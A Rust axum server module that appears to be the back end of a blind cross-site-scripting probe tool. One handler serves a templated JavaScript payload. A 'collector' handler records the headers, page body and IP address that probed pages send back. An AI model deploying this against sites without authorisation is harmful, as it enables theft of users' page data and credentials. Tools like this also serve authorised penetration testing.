use crate::State;
use axum::{
    body::Body,
    extract::{ConnectInfo, Extension, Path},
    http::Request,
    response::IntoResponse,
};
use std::net::SocketAddr;

// deliver the javascript payload from GET
pub async fn probe(
    Extension(state): Extension<State>,
    Path(user): Path<String>,
) -> impl IntoResponse {
    let public_url = std::env::var("PUBLIC_URL").unwrap();
    let template = state.jinja.get_template("probe.js").unwrap();
    axum::response::Html::from(
        template
            .render(minijinja::context! { HOST_URL => public_url, USERNAME => user })
            .unwrap(),
    )
}

// collect info from probe
pub async fn collector(
    Extension(state): Extension<State>,
    Path(user): Path<String>,
    ConnectInfo(peer): ConnectInfo<SocketAddr>,
    request: Request<Body>,
) {
    let mut headers = format!("{:?}", request.headers());
    let mut body = format!("{:?}", request.body());
    println!("{body}");

    // trim to fit in database
    if headers.len() > 1024 {
        headers = (headers[0..1024]).to_string();
    }
    if body.len() > 1024 {
        body = (body[0..1024]).to_string();
    }

    sqlx::query("INSERT INTO pages (username, origin, headers, body) VALUES (?, ?, ?, ?)")
        .bind(user)
        .bind(peer.to_string())
        .bind(headers)
        .bind(body)
        .execute(&state.db_pool)
        .await
        .unwrap();
}

// this is if we want to identify by hostname

// let recipient = body
//     .headers()
//     .get("host")
//     .unwrap()
//     .to_str()
//     .unwrap()
//     .split(".")
//     .into_iter()
//     .next()
//     .unwrap();
